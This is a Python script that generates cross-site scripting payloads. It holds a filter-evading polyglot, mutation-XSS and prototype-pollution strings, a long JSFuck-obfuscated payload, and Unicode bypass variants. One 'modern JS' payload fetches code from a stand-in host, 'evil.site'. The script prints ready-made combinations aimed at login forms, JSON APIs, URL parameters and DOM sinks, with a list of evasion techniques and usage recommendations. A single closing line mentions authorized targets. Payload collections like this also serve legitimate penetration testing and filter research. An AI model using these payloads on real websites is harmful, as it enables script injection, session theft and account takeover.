#!/usr/bin/env python3
"""
XSS Vibes - Ultimate Payload Generator
Combines mXSS, JSFuck, Unicode, Polyglots, and HackVault techniques
"""

import json
import random
import argparse
import sys
from pathlib import Path


class UltimateXSSGenerator:
    def __init__(self):
        self.hackvault_polyglot = "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()///>\\x3e"

        self.mutation_xss = [
            "new MutationObserver(()=>eval('alert(1)')).observe(document,{childList:true,subtree:true})",
            '{"__proto__":{"innerHTML":"<img src=x onerror=alert(1)>"}}',
            "navigator.serviceWorker.register('data:application/javascript,self.onmessage=()=>eval(\"alert(1)\")')",
        ]

        self.jsfuck_payloads = [
            "[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+!+[]]]+([][[]]+[])[+[]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(+![]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(+![]+[![]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]])()([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])())",
            "[]\u200b[(![]+[])[+[]]]\u200c+([![]]+[][[]])[+!+[]+[+[]]]\u200d+(![]+[])[!+[]+!+[]]\u200e+(!![]+[])[+[]]]()",
        ]

        self.unicode_chaos = [
            "<img src=x onerror=alert\u200b\u200c\u200d\ufeff(1)>",
            '<img src=x onerror="\\u202e\'\\u201d>alert(1)//">',
            "𒀀𒀁𒀂<script>alert('𒌋𒀀𒈾 Cuneiform XSS')</script>𒌋𒀀𒈾",
            "ale‌rt(1)",
        ]

        self.modern_js = [
            "(async()=>await(await fetch('//evil.site')).text())()",
            "import('data:text/javascript,alert(1)')",
            "Promise.resolve().then(()=>eval('alert(1)'))",
            "new Worker('data:application/javascript,self.postMessage(eval(\"alert(1)\"))')",
        ]

    def generate_ultimate_payload(self, technique="all"):
        """Generate ultimate XSS payloads combining multiple techniques"""

        print("🔥 XSS Vibes - Ultimate Payload Generator")
        print("=========================================")
        print("🎯 Combining: mXSS + JSFuck + Unicode + Polyglots + HackVault")
        print()

        if technique == "all" or technique == "hackvault":
            print("🏆 HACKVAULT ULTIMATE POLYGLOTS:")
            print("=" * 40)
            print(f"📋 Original 144-char Polyglot:")
            print(f"   {self.hackvault_polyglot}")
            print()
            print(f"📋 HTML-Escaped Version:")
            escaped = (
                self.hackvault_polyglot.replace("<", "&lt;")
                .replace(">", "&gt;")
                .replace("'", "&#039;")
                .replace('"', "&quot;")
            )
            print(f"   {escaped}")
            print()

        if technique == "all" or technique == "mutation":
            print("🧬 MUTATION XSS (mXSS) PAYLOADS:")
            print("=" * 35)
            for i, payload in enumerate(self.mutation_xss, 1):
                print(f"{i:2d}. {payload}")
            print()

        if technique == "all" or technique == "jsfuck":
            print("🤖 JSFUCK + UNICODE CHAOS:")
            print("=" * 30)
            for i, payload in enumerate(self.jsfuck_payloads, 1):
                print(
                    f"{i:2d}. {payload[:100]}..."
                    if len(payload) > 100
                    else f"{i:2d}. {payload}"
                )
            print()

        if technique == "all" or technique == "unicode":
            print("🌍 UNICODE EXPLOITATION:")
            print("=" * 25)
            for i, payload in enumerate(self.unicode_chaos, 1):
                print(f"{i:2d}. {payload}")
            print()

        if technique == "all" or technique == "modern":
            print("⚡ MODERN JAVASCRIPT EXPLOITS:")
            print("=" * 32)
            for i, payload in enumerate(self.modern_js, 1):
                print(f"{i:2d}. {payload}")
            print()

        # Context-specific combinations
        print("🎯 CONTEXT-SPECIFIC COMBINATIONS:")
        print("=" * 35)

        combinations = {
            "Login Form": [
                f"admin'>{self.hackvault_polyglot}",
                f'username"><img src=x onerror={self.unicode_chaos[0]}>',
                f"'{self.mutation_xss[0]}",
            ],
            "JSON API": [
                f'{{"name":"{self.hackvault_polyglot}"}}',
                f"{self.mutation_xss[1]}",
                f'{{"data":"<script>{self.modern_js[2]}</script>"}}',
            ],
            "URL Parameter": [
                f"?search={self.hackvault_polyglot}",
                f"?q=<script>{self.modern_js[0]}</script>",
                f"?data={self.unicode_chaos[2]}",
            ],
            "innerHTML/DOM": [
                f"<div>{self.hackvault_polyglot}</div>",
                f"{self.mutation_xss[0]}",
                f"<script>{self.modern_js[1]}</script>",
            ],
        }

        for context, payloads in combinations.items():
            print(f"\n🔸 {context}:")
            for i, payload in enumerate(payloads, 1):
                display_payload = payload[:80] + "..." if len(payload) > 80 else payload
                print(f"   {i}. {display_payload}")

        print("\n" + "=" * 50)
        print("🛡️ EVASION TECHNIQUES SUMMARY:")
        print("=" * 50)
        print("✅ Case variation (jaVasCript:, oNcliCk=)")
        print("✅ Comment breaking (/*-/*`/*\\`/*)")
        print("✅ Tag malformation (</stYle/</titLe/)")
        print("✅ Unicode zero-width characters")
        print("✅ JSFuck obfuscation")
        print("✅ Prototype pollution")
        print("✅ Mutation observers")
        print("✅ Modern async/await")
        print("✅ Dynamic imports")
        print("✅ Service workers")
        print("✅ CRLF injection")
        print("✅ Ancient script exploitation")

        print("\n🎯 USAGE RECOMMENDATIONS:")
        print("=" * 30)
        print("1. 🔥 Start with HackVault polyglot for maximum context coverage")
        print("2. 🧬 Use mXSS for modern applications with DOM manipulation")
        print("3. 🤖 Deploy JSFuck for extreme obfuscation needs")
        print("4. 🌍 Apply Unicode techniques for filter bypass")
        print("5. ⚡ Leverage modern JS for contemporary frameworks")
        print("6. 🎯 Combine techniques based on target analysis")

        print(f"\n🔥 Ultimate XSS Arsenal Ready!")
        print(f"⚠️  Remember: Only test on authorized targets!")


def main():
    parser = argparse.ArgumentParser(description="XSS Vibes Ultimate Payload Generator")
    parser.add_argument(
        "--technique",
        "-t",
        choices=["all", "hackvault", "mutation", "jsfuck", "unicode", "modern"],
        default="all",
        help="Specific technique to generate",
    )

    args = parser.parse_args()

    generator = UltimateXSSGenerator()
    generator.generate_ultimate_payload(args.technique)


if __name__ == "__main__":
    main()
